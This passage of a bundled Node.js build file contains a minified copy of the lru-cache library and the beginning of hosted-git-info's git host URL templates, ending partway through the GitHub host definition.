"use strict";
var __create = Object.create;
var __defProp = Object.defineProperty;
var __getOwnPropDesc = Object.getOwnPropertyDescriptor;
var __getOwnPropNames = Object.getOwnPropertyNames;
var __getProtoOf = Object.getPrototypeOf;
var __hasOwnProp = Object.prototype.hasOwnProperty;
var __esm = (fn, res, err) => function __init() {
  if (err) throw err[0];
  try {
    return fn && (res = (0, fn[__getOwnPropNames(fn)[0]])(fn = 0)), res;
  } catch (e) {
    throw err = [e], e;
  }
};
var __commonJS = (cb, mod) => function __require() {
  try {
    return mod || (0, cb[__getOwnPropNames(cb)[0]])((mod = { exports: {} }).exports, mod), mod.exports;
  } catch (e) {
    throw mod = 0, e;
  }
};
var __export = (target, all) => {
  for (var name in all)
    __defProp(target, name, { get: all[name], enumerable: true });
};
var __copyProps = (to, from, except, desc) => {
  if (from && typeof from === "object" || typeof from === "function") {
    for (let key of __getOwnPropNames(from))
      if (!__hasOwnProp.call(to, key) && key !== except)
        __defProp(to, key, { get: () => from[key], enumerable: !(desc = __getOwnPropDesc(from, key)) || desc.enumerable });
  }
  return to;
};
var __toESM = (mod, isNodeMode, target) => (target = mod != null ? __create(__getProtoOf(mod)) : {}, __copyProps(
  // If the importer is in node compatibility mode or this is not an ESM
  // file that has been converted to a CommonJS file using a Babel-
  // compatible transform (i.e. "__esModule" has not been set), then set
  // "default" to the CommonJS "module.exports" for node compatibility.
  isNodeMode || !mod || !mod.__esModule ? __defProp(target, "default", { value: mod, enumerable: true }) : target,
  mod
));

// node_modules/.pnpm/lru-cache@11.5.2/node_modules/lru-cache/dist/commonjs/node/index.min.js
var require_index_min = __commonJS({
  "node_modules/.pnpm/lru-cache@11.5.2/node_modules/lru-cache/dist/commonjs/node/index.min.js"(exports2) {
    "use strict";
    var j = (u, t) => () => (t || u((t = { exports: {} }).exports, t), t.exports);
    var I = j((O) => {
      "use strict";
      Object.defineProperty(O, "__esModule", { value: true });
      O.tracing = O.metrics = void 0;
      var U = require("node:diagnostics_channel");
      O.metrics = (0, U.channel)("lru-cache:metrics");
      O.tracing = (0, U.tracingChannel)("lru-cache");
    });
    var P = j((R) => {
      "use strict";
      Object.defineProperty(R, "__esModule", { value: true });
      R.defaultPerf = void 0;
      R.defaultPerf = typeof performance == "object" && performance && typeof performance.now == "function" ? performance : Date;
    });
    Object.defineProperty(exports2, "__esModule", { value: true });
    exports2.LRUCache = void 0;
    var g = I();
    var N = P();
    var C = () => g.metrics.hasSubscribers || g.tracing.hasSubscribers;
    var k = /* @__PURE__ */ new Set();
    var G = typeof process == "object" && process ? process : {};
    var V = (u, t, e, i) => {
      typeof G.emitWarning == "function" ? G.emitWarning(u, t, e, i) : console.error(`[${e}] ${t}: ${u}`);
    };
    var q = (u) => !k.has(u);
    var T = (u) => !!u && u === Math.floor(u) && u > 0 && isFinite(u);
    var H = (u) => T(u) ? u <= Math.pow(2, 8) ? Uint8Array : u <= Math.pow(2, 16) ? Uint16Array : u <= Math.pow(2, 32) ? Uint32Array : u <= Number.MAX_SAFE_INTEGER ? W : null : null;
    var W = class extends Array {
      constructor(t) {
        super(t), this.fill(0);
      }
    };
    var L = class u {
      heap;
      length;
      static #o = false;
      static create(t) {
        let e = H(t);
        if (!e) return [];
        u.#o = true;
        let i = new u(t, e);
        return u.#o = false, i;
      }
      constructor(t, e) {
        if (!u.#o) throw new TypeError("instantiate Stack using Stack.create(n)");
        this.heap = new e(t), this.length = 0;
      }
      push(t) {
        this.heap[this.length++] = t;
      }
      pop() {
        return this.heap[--this.length];
      }
    };
    var M = class u {
      #o;
      #c;
      #m;
      #W;
      #S;
      #x;
      #j;
      #w;
      get perf() {
        return this.#w;
      }
      ttl;
      ttlResolution;
      ttlAutopurge;
      updateAgeOnGet;
      updateAgeOnHas;
      allowStale;
      noDisposeOnSet;
      noUpdateTTL;
      maxEntrySize;
      sizeCalculation;
      noDeleteOnFetchRejection;
      noDeleteOnStaleGet;
      allowStaleOnFetchAbort;
      allowStaleOnFetchRejection;
      ignoreFetchAbort;
      backgroundFetchSize;
      #n;
      #b;
      #s;
      #i;
      #t;
      #l;
      #u;
      #a;
      #h;
      #_;
      #r;
      #y;
      #F;
      #d;
      #g;
      #T;
      #U;
      #f;
      #R;
      static unsafeExposeInternals(t) {
        return { starts: t.#F, ttls: t.#d, autopurgeTimers: t.#g, sizes: t.#y, keyMap: t.#s, keyList: t.#i, valList: t.#t, next: t.#l, prev: t.#u, get head() {
          return t.#a;
        }, get tail() {
          return t.#h;
        }, free: t.#_, isBackgroundFetch: (e) => t.#e(e), backgroundFetch: (e, i, s, n) => t.#G(e, i, s, n), moveToTail: (e) => t.#M(e), indexes: (e) => t.#A(e), rindexes: (e) => t.#z(e), isStale: (e) => t.#p(e) };
      }
      get max() {
        return this.#o;
      }
      get maxSize() {
        return this.#c;
      }
      get calculatedSize() {
        return this.#b;
      }
      get size() {
        return this.#n;
      }
      get fetchMethod() {
        return this.#x;
      }
      get memoMethod() {
        return this.#j;
      }
      get dispose() {
        return this.#m;
      }
      get onInsert() {
        return this.#W;
      }
      get disposeAfter() {
        return this.#S;
      }
      constructor(t) {
        let { max: e = 0, ttl: i, ttlResolution: s = 1, ttlAutopurge: n, updateAgeOnGet: o, updateAgeOnHas: l, allowStale: h, dispose: r, onInsert: c, disposeAfter: w, noDisposeOnSet: y, noUpdateTTL: d, maxSize: p = 0, maxEntrySize: f = 0, sizeCalculation: _, fetchMethod: a, memoMethod: S, noDeleteOnFetchRejection: F, noDeleteOnStaleGet: b, allowStaleOnFetchRejection: m, allowStaleOnFetchAbort: A, ignoreFetchAbort: z, backgroundFetchSize: x = 1, perf: v } = t;
        if (this.backgroundFetchSize = x, v !== void 0 && typeof v?.now != "function") throw new TypeError("perf option must have a now() method if specified");
        if (this.#w = v ?? N.defaultPerf, e !== 0 && !T(e)) throw new TypeError("max option must be a nonnegative integer");
        let E = e ? H(e) : Array;
        if (!E) throw new Error("invalid max value: " + e);
        if (this.#o = e, this.#c = p, this.maxEntrySize = f || this.#c, this.sizeCalculation = _, this.sizeCalculation) {
          if (!this.#c && !this.maxEntrySize) throw new TypeError("cannot set sizeCalculation without setting maxSize or maxEntrySize");
          if (typeof this.sizeCalculation != "function") throw new TypeError("sizeCalculation set to non-function");
        }
        if (S !== void 0 && typeof S != "function") throw new TypeError("memoMethod must be a function if defined");
        if (this.#j = S, a !== void 0 && typeof a != "function") throw new TypeError("fetchMethod must be a function if specified");
        if (this.#x = a, this.#U = !!a, this.#s = /* @__PURE__ */ new Map(), this.#i = Array.from({ length: e }).fill(void 0), this.#t = Array.from({ length: e }).fill(void 0), this.#l = new E(e), this.#u = new E(e), this.#a = 0, this.#h = 0, this.#_ = L.create(e), this.#n = 0, this.#b = 0, typeof r == "function" && (this.#m = r), typeof c == "function" && (this.#W = c), typeof w == "function" ? (this.#S = w, this.#r = []) : (this.#S = void 0, this.#r = void 0), this.#T = !!this.#m, this.#R = !!this.#W, this.#f = !!this.#S, this.noDisposeOnSet = !!y, this.noUpdateTTL = !!d, this.noDeleteOnFetchRejection = !!F, this.allowStaleOnFetchRejection = !!m, this.allowStaleOnFetchAbort = !!A, this.ignoreFetchAbort = !!z, this.maxEntrySize !== 0) {
          if (this.#c !== 0 && !T(this.#c)) throw new TypeError("maxSize must be a positive integer if specified");
          if (!T(this.maxEntrySize)) throw new TypeError("maxEntrySize must be a positive integer if specified");
          this.#X();
        }
        if (this.allowStale = !!h, this.noDeleteOnStaleGet = !!b, this.updateAgeOnGet = !!o, this.updateAgeOnHas = !!l, this.ttlResolution = T(s) || s === 0 ? s : 1, this.ttlAutopurge = !!n, this.ttl = i || 0, this.ttl) {
          if (!T(this.ttl)) throw new TypeError("ttl must be a positive integer if specified");
          this.#k();
        }
        if (this.#o === 0 && this.ttl === 0 && this.#c === 0) throw new TypeError("At least one of max, maxSize, or ttl is required");
        if (!this.ttlAutopurge && !this.#o && !this.#c) {
          let D = "LRU_CACHE_UNBOUNDED";
          q(D) && (k.add(D), V("TTL caching without ttlAutopurge, max, or maxSize can result in unbounded memory consumption.", "UnboundedCacheWarning", D, u));
        }
      }
      getRemainingTTL(t) {
        return this.#s.has(t) ? 1 / 0 : 0;
      }
      #k() {
        let t = new W(this.#o), e = new W(this.#o);
        this.#d = t, this.#F = e;
        let i = this.ttlAutopurge ? Array.from({ length: this.#o }) : void 0;
        this.#g = i, this.#H = (h, r, c = this.#w.now()) => {
          e[h] = r !== 0 ? c : 0, t[h] = r, s(h, r);
        }, this.#D = (h) => {
          e[h] = t[h] !== 0 ? this.#w.now() : 0, s(h, t[h]);
        };
        let s = this.ttlAutopurge ? (h, r) => {
          if (i?.[h] && (clearTimeout(i[h]), i[h] = void 0), r && r !== 0 && i) {
            let c = setTimeout(() => {
              this.#p(h) ? (this.#v(this.#i[h], "expire"), i[h] = void 0) : s(h, l(h));
            }, r + 1);
            c.unref && c.unref(), i[h] = c;
          }
        } : () => {
        };
        this.#E = (h, r) => {
          if (t[r]) {
            let c = t[r], w = e[r];
            if (!c || !w) return;
            h.ttl = c, h.start = w, h.now = n || o();
            let y = h.now - w;
            h.remainingTTL = c - y;
          }
        };
        let n = 0, o = () => {
          let h = this.#w.now();
          if (this.ttlResolution > 0) {
            n = h;
            let r = setTimeout(() => n = 0, this.ttlResolution);
            r.unref && r.unref();
          }
          return h;
        };
        this.getRemainingTTL = (h) => {
          let r = this.#s.get(h);
          return r === void 0 ? 0 : l(r);
        };
        let l = (h) => {
          let r = t[h], c = e[h];
          if (!r || !c) return 1 / 0;
          let w = (n || o()) - c;
          return r - w;
        };
        this.#p = (h) => {
          let r = e[h], c = t[h];
          return !!c && !!r && (n || o()) - r > c;
        };
      }
      #D = () => {
      };
      #E = () => {
      };
      #H = () => {
      };
      #p = () => false;
      #X() {
        let t = new W(this.#o);
        this.#b = 0, this.#y = t, this.#C = (e) => {
          this.#b -= t[e], t[e] = 0;
        }, this.#N = (e, i, s, n) => {
          if (!T(s)) {
            if (this.#e(i)) return this.backgroundFetchSize;
            if (n) {
              if (typeof n != "function") throw new TypeError("sizeCalculation must be a function");
              if (s = n(i, e), !T(s)) throw new TypeError("sizeCalculation return invalid (expect positive integer)");
            } else throw new TypeError("invalid size value (must be positive integer). When maxSize or maxEntrySize is used, sizeCalculation or size must be set.");
          }
          return s;
        }, this.#I = (e, i, s) => {
          if (t[e] = i, this.#c) {
            let n = this.#c - t[e];
            for (; this.#b > n; ) this.#P(true);
          }
          this.#b += t[e], s && (s.entrySize = i, s.totalCalculatedSize = this.#b);
        };
      }
      #C = (t) => {
      };
      #I = (t, e, i) => {
      };
      #N = (t, e, i, s) => {
        if (i || s) throw new TypeError("cannot set size without setting maxSize or maxEntrySize on cache");
        return 0;
      };
      *#A({ allowStale: t = this.allowStale } = {}) {
        if (this.#n) for (let e = this.#h; this.#V(e) && ((t || !this.#p(e)) && (yield e), e !== this.#a); ) e = this.#u[e];
      }
      *#z({ allowStale: t = this.allowStale } = {}) {
        if (this.#n) for (let e = this.#a; this.#V(e) && ((t || !this.#p(e)) && (yield e), e !== this.#h); ) e = this.#l[e];
      }
      #V(t) {
        return t !== void 0 && this.#s.get(this.#i[t]) === t;
      }
      *entries() {
        for (let t of this.#A()) this.#t[t] !== void 0 && this.#i[t] !== void 0 && !this.#e(this.#t[t]) && (yield [this.#i[t], this.#t[t]]);
      }
      *rentries() {
        for (let t of this.#z()) this.#t[t] !== void 0 && this.#i[t] !== void 0 && !this.#e(this.#t[t]) && (yield [this.#i[t], this.#t[t]]);
      }
      *keys() {
        for (let t of this.#A()) {
          let e = this.#i[t];
          e !== void 0 && !this.#e(this.#t[t]) && (yield e);
        }
      }
      *rkeys() {
        for (let t of this.#z()) {
          let e = this.#i[t];
          e !== void 0 && !this.#e(this.#t[t]) && (yield e);
        }
      }
      *values() {
        for (let t of this.#A()) this.#t[t] !== void 0 && !this.#e(this.#t[t]) && (yield this.#t[t]);
      }
      *rvalues() {
        for (let t of this.#z()) this.#t[t] !== void 0 && !this.#e(this.#t[t]) && (yield this.#t[t]);
      }
      [Symbol.iterator]() {
        return this.entries();
      }
      [Symbol.toStringTag] = "LRUCache";
      find(t, e = {}) {
        for (let i of this.#A()) {
          let s = this.#t[i], n = this.#e(s) ? s.__staleWhileFetching : s;
          if (n !== void 0 && t(n, this.#i[i], this)) return this.#L(this.#i[i], e);
        }
      }
      forEach(t, e = this) {
        for (let i of this.#A()) {
          let s = this.#t[i], n = this.#e(s) ? s.__staleWhileFetching : s;
          n !== void 0 && t.call(e, n, this.#i[i], this);
        }
      }
      rforEach(t, e = this) {
        for (let i of this.#z()) {
          let s = this.#t[i], n = this.#e(s) ? s.__staleWhileFetching : s;
          n !== void 0 && t.call(e, n, this.#i[i], this);
        }
      }
      purgeStale() {
        let t = false;
        for (let e of this.#z({ allowStale: true })) this.#p(e) && (this.#v(this.#i[e], "expire"), t = true);
        return t;
      }
      info(t) {
        let e = this.#s.get(t);
        if (e === void 0) return;
        let i = this.#t[e], s = this.#e(i) ? i.__staleWhileFetching : i;
        if (s === void 0) return;
        let n = { value: s };
        if (this.#d && this.#F) {
          let o = this.#d[e], l = this.#F[e];
          if (o && l) {
            let h = o - (this.#w.now() - l);
            n.ttl = h, n.start = Date.now();
          }
        }
        return this.#y && (n.size = this.#y[e]), n;
      }
      dump() {
        let t = [];
        for (let e of this.#A({ allowStale: true })) {
          let i = this.#i[e], s = this.#t[e], n = this.#e(s) ? s.__staleWhileFetching : s;
          if (n === void 0 || i === void 0) continue;
          let o = { value: n };
          if (this.#d && this.#F) {
            o.ttl = this.#d[e];
            let l = this.#w.now() - this.#F[e];
            o.start = Math.floor(Date.now() - l);
          }
          this.#y && (o.size = this.#y[e]), t.unshift([i, o]);
        }
        return t;
      }
      load(t) {
        this.clear();
        for (let [e, i] of t) {
          if (i.start) {
            let s = Date.now() - i.start;
            i.start = this.#w.now() - s;
          }
          this.#O(e, i.value, i);
        }
      }
      set(t, e, i = {}) {
        let { status: s = g.metrics.hasSubscribers ? {} : void 0 } = i;
        i.status = s, s && (s.op = "set", s.key = t, e !== void 0 && (s.value = e), s.cache = this);
        let n = this.#O(t, e, i);
        return s && g.metrics.hasSubscribers && g.metrics.publish(s), n;
      }
      #O(t, e, i, s) {
        let { ttl: n = this.ttl, start: o, noDisposeOnSet: l = this.noDisposeOnSet, sizeCalculation: h = this.sizeCalculation, status: r } = i, c = this.#e(e);
        if (e === void 0) return r && (r.set = "deleted"), this.delete(t), this;
        let { noUpdateTTL: w = this.noUpdateTTL } = i;
        r && !c && (r.value = e);
        let y = this.#N(t, e, i.size || 0, h, r);
        if (this.maxEntrySize && y > this.maxEntrySize) return this.#v(t, "set"), r && (r.set = "miss", r.maxEntrySizeExceeded = true), this;
        let d = this.#n === 0 ? void 0 : this.#s.get(t);
        if (d === void 0) d = this.#n === 0 ? this.#h : this.#_.length !== 0 ? this.#_.pop() : this.#n === this.#o ? this.#P(false) : this.#n, this.#i[d] = t, this.#t[d] = e, this.#s.set(t, d), this.#l[this.#h] = d, this.#u[d] = this.#h, this.#h = d, this.#n++, this.#I(d, y, r), r && (r.set = "add"), w = false, this.#R && !c && this.#W?.(e, t, "add");
        else {
          this.#M(d);
          let p = this.#t[d];
          if (e !== p) {
            if (!l) if (this.#e(p)) {
              p !== s && p.__abortController.abort(new Error("replaced"));
              let { __staleWhileFetching: f } = p;
              f !== void 0 && f !== e && (this.#T && this.#m?.(f, t, "set"), this.#f && this.#r?.push([f, t, "set"]));
            } else this.#T && this.#m?.(p, t, "set"), this.#f && this.#r?.push([p, t, "set"]);
            if (this.#C(d), this.#I(d, y, r), this.#t[d] = e, !c) {
              let f = p && this.#e(p) ? p.__staleWhileFetching : p, _ = f === void 0 ? "add" : e !== f ? "replace" : "update";
              r && (r.set = _, f !== void 0 && (r.oldValue = f)), this.#R && this.onInsert?.(e, t, _);
            }
          } else c || (r && (r.set = "update"), this.#R && this.onInsert?.(e, t, "update"));
        }
        if (n !== 0 && !this.#d && this.#k(), this.#d && (w || this.#H(d, n, o), r && this.#E(r, d)), !l && this.#f && this.#r) {
          let p = this.#r, f;
          for (; f = p?.shift(); ) this.#S?.(...f);
        }
        return this;
      }
      pop() {
        try {
          for (; this.#n; ) {
            let t = this.#t[this.#a];
            if (this.#P(true), this.#e(t)) {
              if (t.__staleWhileFetching) return t.__staleWhileFetching;
            } else if (t !== void 0) return t;
          }
        } finally {
          if (this.#f && this.#r) {
            let t = this.#r, e;
            for (; e = t?.shift(); ) this.#S?.(...e);
          }
        }
      }
      #P(t) {
        let e = this.#a, i = this.#i[e], s = this.#t[e], n = this.#e(s);
        n && s.__abortController.abort(new Error("evicted"));
        let o = n ? s.__staleWhileFetching : s;
        return (this.#T || this.#f) && o !== void 0 && (this.#T && this.#m?.(o, i, "evict"), this.#f && this.#r?.push([o, i, "evict"])), this.#C(e), this.#g?.[e] && (clearTimeout(this.#g[e]), this.#g[e] = void 0), t && (this.#i[e] = void 0, this.#t[e] = void 0, this.#_.push(e)), this.#n === 1 ? (this.#a = this.#h = 0, this.#_.length = 0) : this.#a = this.#l[e], this.#s.delete(i), this.#n--, e;
      }
      has(t, e = {}) {
        let { status: i = g.metrics.hasSubscribers ? {} : void 0 } = e;
        e.status = i, i && (i.op = "has", i.key = t, i.cache = this);
        let s = this.#Y(t, e);
        return g.metrics.hasSubscribers && g.metrics.publish(i), s;
      }
      #Y(t, e = {}) {
        let { updateAgeOnHas: i = this.updateAgeOnHas, status: s } = e, n = this.#s.get(t);
        if (n !== void 0) {
          let o = this.#t[n];
          if (this.#e(o) && o.__staleWhileFetching === void 0) return false;
          if (this.#p(n)) s && (s.has = "stale", this.#E(s, n));
          else return i && this.#D(n), s && (s.has = "hit", this.#E(s, n)), true;
        } else s && (s.has = "miss");
        return false;
      }
      peek(t, e = {}) {
        let { status: i = C() ? {} : void 0 } = e;
        i && (i.op = "peek", i.key = t, i.cache = this), e.status = i;
        let s = this.#J(t, e);
        return g.metrics.hasSubscribers && g.metrics.publish(i), s;
      }
      #J(t, e) {
        let { status: i, allowStale: s = this.allowStale } = e, n = this.#s.get(t);
        if (n === void 0 || !s && this.#p(n)) {
          i && (i.peek = n === void 0 ? "miss" : "stale");
          return;
        }
        let o = this.#t[n], l = this.#e(o) ? o.__staleWhileFetching : o;
        return i && (l !== void 0 ? (i.peek = "hit", i.value = l) : i.peek = "miss"), l;
      }
      #G(t, e, i, s) {
        let n = e === void 0 ? void 0 : this.#t[e];
        if (this.#e(n)) return n;
        let o = new AbortController(), { signal: l } = i;
        l?.addEventListener("abort", () => o.abort(l.reason), { signal: o.signal });
        let h = { signal: o.signal, options: i, context: s }, r = (f, _ = false) => {
          let { aborted: a } = o.signal, S = i.ignoreFetchAbort && f !== void 0, F = i.ignoreFetchAbort || !!(i.allowStaleOnFetchAbort && f !== void 0);
          if (i.status && (a && !_ ? (i.status.fetchAborted = true, i.status.fetchError = o.signal.reason, S && (i.status.fetchAbortIgnored = true)) : i.status.fetchResolved = true), a && !S && !_) return w(o.signal.reason, F);
          let b = d, m = this.#t[e];
          return (m === d || m === void 0 && S && _) && (f === void 0 ? b.__staleWhileFetching !== void 0 ? this.#t[e] = b.__staleWhileFetching : this.#v(t, "fetch") : (i.status && (i.status.fetchUpdated = true), this.#O(t, f, h.options, b))), f;
        }, c = (f) => (i.status && (i.status.fetchRejected = true, i.status.fetchError = f), w(f, false)), w = (f, _) => {
          let { aborted: a } = o.signal, S = a && i.allowStaleOnFetchAbort, F = S || i.allowStaleOnFetchRejection, b = F || i.noDeleteOnFetchRejection, m = d;
          if (this.#t[e] === d && (!b || !_ && m.__staleWhileFetching === void 0 ? this.#v(t, "fetch") : S || (this.#t[e] = m.__staleWhileFetching)), F) return i.status && m.__staleWhileFetching !== void 0 && (i.status.returnedStale = true), m.__staleWhileFetching;
          if (m.__returned === m) throw f;
        }, y = (f, _) => {
          let a = this.#x?.(t, n, h);
          o.signal.addEventListener("abort", () => {
            (!i.ignoreFetchAbort || i.allowStaleOnFetchAbort) && (f(void 0), i.allowStaleOnFetchAbort && (f = (S) => r(S, true)));
          }), a && a instanceof Promise ? a.then((S) => f(S === void 0 ? void 0 : S), _) : a !== void 0 && f(a);
        };
        i.status && (i.status.fetchDispatched = true);
        let d = new Promise(y).then(r, c), p = Object.assign(d, { __abortController: o, __staleWhileFetching: n, __returned: void 0 });
        return e === void 0 ? (this.#O(t, p, { ...h.options, status: void 0 }), e = this.#s.get(t)) : this.#t[e] = p, p;
      }
      #e(t) {
        if (!this.#U) return false;
        let e = t;
        return !!e && e instanceof Promise && e.hasOwnProperty("__staleWhileFetching") && e.__abortController instanceof AbortController;
      }
      fetch(t, e = {}) {
        let i = g.tracing.hasSubscribers, { status: s = C() ? {} : void 0 } = e;
        e.status = s, s && e.context && (s.context = e.context);
        let n = this.#q(t, e);
        return s && i && (s.trace = true, g.tracing.tracePromise(() => n, s).catch(() => {
        })), n;
      }
      async #q(t, e = {}) {
        let { allowStale: i = this.allowStale, updateAgeOnGet: s = this.updateAgeOnGet, noDeleteOnStaleGet: n = this.noDeleteOnStaleGet, ttl: o = this.ttl, noDisposeOnSet: l = this.noDisposeOnSet, size: h = 0, sizeCalculation: r = this.sizeCalculation, noUpdateTTL: c = this.noUpdateTTL, noDeleteOnFetchRejection: w = this.noDeleteOnFetchRejection, allowStaleOnFetchRejection: y = this.allowStaleOnFetchRejection, ignoreFetchAbort: d = this.ignoreFetchAbort, allowStaleOnFetchAbort: p = this.allowStaleOnFetchAbort, context: f, forceRefresh: _ = false, status: a, signal: S } = e;
        if (a && (a.op = "fetch", a.key = t, _ && (a.forceRefresh = true), a.cache = this), !this.#U) return a && (a.fetch = "get"), this.#L(t, { allowStale: i, updateAgeOnGet: s, noDeleteOnStaleGet: n, status: a });
        let F = { allowStale: i, updateAgeOnGet: s, noDeleteOnStaleGet: n, ttl: o, noDisposeOnSet: l, size: h, sizeCalculation: r, noUpdateTTL: c, noDeleteOnFetchRejection: w, allowStaleOnFetchRejection: y, allowStaleOnFetchAbort: p, ignoreFetchAbort: d, status: a, signal: S }, b = this.#s.get(t);
        if (b === void 0) {
          a && (a.fetch = "miss");
          let m = this.#G(t, b, F, f);
          return m.__returned = m;
        } else {
          let m = this.#t[b];
          if (this.#e(m)) {
            let E = i && m.__staleWhileFetching !== void 0;
            return a && (a.fetch = "inflight", E && (a.returnedStale = true)), E ? m.__staleWhileFetching : m.__returned = m;
          }
          let A = this.#p(b);
          if (!_ && !A) return a && (a.fetch = "hit"), this.#M(b), s && this.#D(b), a && this.#E(a, b), m;
          let z = this.#G(t, b, F, f), v = z.__staleWhileFetching !== void 0 && i;
          return a && (a.fetch = A ? "stale" : "refresh", v && A && (a.returnedStale = true)), v ? z.__staleWhileFetching : z.__returned = z;
        }
      }
      forceFetch(t, e = {}) {
        let i = g.tracing.hasSubscribers, { status: s = C() ? {} : void 0 } = e;
        e.status = s, s && e.context && (s.context = e.context);
        let n = this.#K(t, e);
        return s && i && (s.trace = true, g.tracing.tracePromise(() => n, s).catch(() => {
        })), n;
      }
      async #K(t, e = {}) {
        let i = await this.#q(t, e);
        if (i === void 0) throw new Error("fetch() returned undefined");
        return i;
      }
      memo(t, e = {}) {
        let { status: i = g.metrics.hasSubscribers ? {} : void 0 } = e;
        e.status = i, i && (i.op = "memo", i.key = t, e.context && (i.context = e.context), i.cache = this);
        let s = this.#Q(t, e);
        return i && (i.value = s), g.metrics.hasSubscribers && g.metrics.publish(i), s;
      }
      #Q(t, e = {}) {
        let i = this.#j;
        if (!i) throw new Error("no memoMethod provided to constructor");
        let { context: s, status: n, forceRefresh: o, ...l } = e;
        n && o && (n.forceRefresh = true);
        let h = this.#L(t, l), r = o || h === void 0;
        if (n && (n.memo = r ? "miss" : "hit", r || (n.value = h)), !r) return h;
        let c = i(t, h, { options: l, context: s });
        return n && (n.value = c), this.#O(t, c, l), c;
      }
      get(t, e = {}) {
        let { status: i = g.metrics.hasSubscribers ? {} : void 0 } = e;
        e.status = i, i && (i.op = "get", i.key = t, i.cache = this);
        let s = this.#L(t, e);
        return i && (s !== void 0 && (i.value = s), g.metrics.hasSubscribers && g.metrics.publish(i)), s;
      }
      #L(t, e = {}) {
        let { allowStale: i = this.allowStale, updateAgeOnGet: s = this.updateAgeOnGet, noDeleteOnStaleGet: n = this.noDeleteOnStaleGet, status: o } = e, l = this.#s.get(t);
        if (l === void 0) {
          o && (o.get = "miss");
          return;
        }
        let h = this.#t[l], r = this.#e(h);
        return o && this.#E(o, l), this.#p(l) ? r ? (o && (o.get = "stale-fetching"), i && h.__staleWhileFetching !== void 0 ? (o && (o.returnedStale = true), h.__staleWhileFetching) : void 0) : (n || this.#v(t, "expire"), o && (o.get = "stale"), i ? (o && (o.returnedStale = true), h) : void 0) : (o && (o.get = r ? "fetching" : "hit"), this.#M(l), s && this.#D(l), r ? h.__staleWhileFetching : h);
      }
      #B(t, e) {
        this.#u[e] = t, this.#l[t] = e;
      }
      #M(t) {
        t !== this.#h && (t === this.#a ? this.#a = this.#l[t] : this.#B(this.#u[t], this.#l[t]), this.#B(this.#h, t), this.#h = t);
      }
      delete(t) {
        return this.#v(t, "delete");
      }
      #v(t, e) {
        g.metrics.hasSubscribers && g.metrics.publish({ op: "delete", delete: e, key: t, cache: this });
        let i = false;
        if (this.#n !== 0) {
          let s = this.#s.get(t);
          if (s !== void 0) if (this.#g?.[s] && (clearTimeout(this.#g[s]), this.#g[s] = void 0), i = true, this.#n === 1) this.#$(e);
          else {
            this.#C(s);
            let n = this.#t[s];
            if (this.#e(n) ? n.__abortController.abort(new Error("deleted")) : (this.#T || this.#f) && (this.#T && this.#m?.(n, t, e), this.#f && this.#r?.push([n, t, e])), this.#s.delete(t), this.#i[s] = void 0, this.#t[s] = void 0, s === this.#h) this.#h = this.#u[s];
            else if (s === this.#a) this.#a = this.#l[s];
            else {
              let o = this.#u[s];
              this.#l[o] = this.#l[s];
              let l = this.#l[s];
              this.#u[l] = this.#u[s];
            }
            this.#n--, this.#_.push(s);
          }
        }
        if (this.#f && this.#r?.length) {
          let s = this.#r, n;
          for (; n = s?.shift(); ) this.#S?.(...n);
        }
        return i;
      }
      clear() {
        return this.#$("delete");
      }
      #$(t) {
        for (let e of this.#z({ allowStale: true })) {
          let i = this.#t[e];
          if (this.#e(i)) i.__abortController.abort(new Error("deleted"));
          else {
            let s = this.#i[e];
            this.#T && this.#m?.(i, s, t), this.#f && this.#r?.push([i, s, t]);
          }
        }
        if (this.#s.clear(), this.#t.fill(void 0), this.#i.fill(void 0), this.#d && this.#F) {
          this.#d.fill(0), this.#F.fill(0);
          for (let e of this.#g ?? []) e !== void 0 && clearTimeout(e);
          this.#g?.fill(void 0);
        }
        if (this.#y && this.#y.fill(0), this.#a = 0, this.#h = 0, this.#_.length = 0, this.#b = 0, this.#n = 0, this.#f && this.#r) {
          let e = this.#r, i;
          for (; i = e?.shift(); ) this.#S?.(...i);
        }
      }
    };
    exports2.LRUCache = M;
  }
});

// node_modules/.pnpm/hosted-git-info@10.1.1/node_modules/hosted-git-info/lib/hosts.js
var require_hosts = __commonJS({
  "node_modules/.pnpm/hosted-git-info@10.1.1/node_modules/hosted-git-info/lib/hosts.js"(exports2, module2) {
    "use strict";
    var maybeJoin = (...args) => args.every((arg) => arg) ? args.join("") : "";
    var maybeEncode = (arg) => arg ? encodeURIComponent(arg) : "";
    var formatHashFragment = (f) => f.toLowerCase().replace(/^\W+/g, "").replace(/(?<!\W)\W+$/, "").replace(/\//g, "").replace(/\W+/g, "-");
    var defaults = {
      sshtemplate: ({ domain, user, project, committish }) => `git@${domain}:${user}/${project}.git${maybeJoin("#", committish)}`,
      sshurltemplate: ({ domain, user, project, committish }) => `git+ssh://git@${domain}/${user}/${project}.git${maybeJoin("#", committish)}`,
      edittemplate: ({ domain, user, project, committish, editpath, path }) => `https://${domain}/${user}/${project}${maybeJoin("/", editpath, "/", maybeEncode(committish || "HEAD"), "/", path)}`,
      browsetemplate: ({ domain, user, project, committish, treepath }) => `https://${domain}/${user}/${project}${maybeJoin("/", treepath, "/", maybeEncode(committish))}`,
      browsetreetemplate: ({ domain, user, project, committish, treepath, path, fragment, hashformat }) => `https://${domain}/${user}/${project}/${treepath}/${maybeEncode(committish || "HEAD")}/${path}${maybeJoin("#", hashformat(fragment || ""))}`,
      browseblobtemplate: ({ domain, user, project, committish, blobpath, path, fragment, hashformat }) => `https://${domain}/${user}/${project}/${blobpath}/${maybeEncode(committish || "HEAD")}/${path}${maybeJoin("#", hashformat(fragment || ""))}`,
      docstemplate: ({ domain, user, project, treepath, committish }) => `https://${domain}/${user}/${project}${maybeJoin("/", treepath, "/", maybeEncode(committish))}#readme`,
      httpstemplate: ({ auth, domain, user, project, committish }) => `git+https://${maybeJoin(auth, "@")}${domain}/${user}/${project}.git${maybeJoin("#", committish)}`,
      filetemplate: ({ domain, user, project, committish, path }) => `https://${domain}/${user}/${project}/raw/${maybeEncode(committish || "HEAD")}/${path}`,
      shortcuttemplate: ({ type, user, project, committish }) => `${type}:${user}/${project}${maybeJoin("#", committish)}`,
      pathtemplate: ({ user, project, committish }) => `${user}/${project}${maybeJoin("#", committish)}`,
      bugstemplate: ({ domain, user, project }) => `https://${domain}/${user}/${project}/issues`,
      hashformat: formatHashFragment
    };
    var hosts = {};
    hosts.github = {
      // First two are insecure and generally shouldn't be used any more, but
      // they are still supported.
      protocols: ["git:", "http:", "git+ssh:", "git+https:", "ssh:", "https:"],
      domain: "github.com",
      treepath: "tree",
      blobpath: "blob",
      editpath: "edit",
